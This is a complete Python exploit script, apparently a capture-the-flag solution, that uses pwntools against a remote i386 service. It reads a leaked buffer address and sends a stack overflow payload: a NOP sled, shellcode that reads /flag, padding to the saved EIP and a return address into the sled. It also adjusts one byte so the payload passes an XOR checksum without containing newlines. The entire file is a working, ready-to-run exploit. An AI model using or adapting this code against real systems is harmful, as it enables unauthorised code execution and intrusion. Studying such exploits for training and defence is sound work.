#!/usr/bin/env python3

from pwn import *
import sys


def xor_bytes(data: bytes) -> int:
    x = 0
    for b in data:
        x ^= b
    return x


def build_payload(buf_addr: int) -> bytes:
    buffer_size = 1024
    offset_to_eip = 1036

    # Shellcode: print /flag then exit.
    assembly = shellcraft.i386.linux.readfile("/flag", 1) + shellcraft.i386.linux.exit()
    sc = asm(assembly, arch="i386", os="linux")

    if len(sc) > buffer_size:
        raise Exception("Shellcode too large for buffer")

    # NOP sled + shellcode entirely inside the real buffer.
    buf = asm(shellcraft.i386.nop()) * (buffer_size - len(sc)) + sc

    # Pad from end of buffer up to saved EIP overwrite.
    if len(buf) > offset_to_eip:
        raise Exception("Internal error: buf longer than offset_to_eip")
    pad = b"C" * (offset_to_eip - len(buf))

    # Return into the NOP sled.
    ret = p32(buf_addr + 0x10)
    payload = buf + pad + ret

    # Fix checksum to 0 by flipping one byte in the NOP sled.
    # (Avoid producing a newline byte which would truncate input.)
    total_xor = xor_bytes(payload)
    for idx in range(0, min(128, len(payload))):
        old = payload[idx]
        new = old ^ total_xor
        if new != 0x0A:
            payload = payload[:idx] + bytes([new]) + payload[idx + 1 :]
            break
    else:
        raise Exception("Failed to fix checksum without creating newline")

    if b"\n" in payload:
        raise Exception("Payload contains newline byte; would truncate input")
    return payload


def main() -> int:
    if len(sys.argv) != 3:
        print(f"Usage: {sys.argv[0]} <host> <port>")
        return 2

    context(arch="i386", os="linux")
    conn = remote(sys.argv[1], int(sys.argv[2]))

    conn.recvuntil(b"Your service ticket id is: ")
    address_string = conn.recvline().strip()
    buf_addr = int(address_string, 16)

    payload = build_payload(buf_addr)
    conn.sendline(payload)
    sys.stdout.buffer.write(conn.recvall())
    return 0


if __name__ == "__main__":
    raise SystemExit(main())

